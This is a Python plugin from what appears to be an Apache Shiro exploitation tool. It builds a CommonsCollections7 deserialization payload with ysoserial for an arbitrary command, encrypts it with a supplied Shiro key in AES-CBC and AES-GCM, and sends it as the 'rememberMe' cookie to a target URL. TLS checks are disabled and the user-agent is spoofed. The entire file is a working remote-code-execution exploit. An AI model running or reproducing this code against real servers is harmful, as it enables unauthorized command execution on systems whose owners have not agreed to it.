# -*- coding: utf-8 -*-
# By 斯文beast  svenbeast.com

import os
import re
import base64
import uuid
import subprocess
import requests
import sys
import threadpool
from Crypto.Cipher import AES
from ..main import Idea
requests.packages.urllib3.disable_warnings()

JAR_FILE = 'moule/ysoserial.jar'

@Idea.plugin_register('Class10:CommonsCollections7')
class CommonsCollections7(object):
    def process(self,url,command,resKey,func):
        self.sendPayload(url,command,resKey)


    def gcm_encode(self,resKey,file_body):

        mode = AES.MODE_GCM
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(resKey), mode, iv)

        ciphertext, tag = encryptor.encrypt_and_digest(file_body)
        ciphertext = ciphertext + tag
        payload = base64.b64encode(iv + ciphertext)

        return payload


    def cbc_encode(self,resKey,file_body):

        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(resKey), mode, iv)   #受key影响的encryptor
        payload = base64.b64encode(iv + encryptor.encrypt(file_body))

        return payload


    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        key = resKey
        target = url
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections7', command],       #popen
                                    stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ( (BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        file_body = pad(popen.stdout.read())         #受popen影响的file_body

        payloadCBC = self.cbc_encode(resKey,file_body)
        payloadGCM = self.gcm_encode(resKey,file_body)

        header={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
            }
            
        try:
            x = requests.post(url,  headers=header, cookies={'rememberMe': payloadCBC.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
            y = requests.post(url,  headers=header, cookies={'rememberMe': payloadGCM.decode()+"="},verify=False, timeout=20)  # 发送验证请求2
            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
            if(x.status_code==200):
 
                print("[+]   ****CommonsCollections7模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****CommonsCollections7模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
        except Exception as e:
            print(e)
            return False

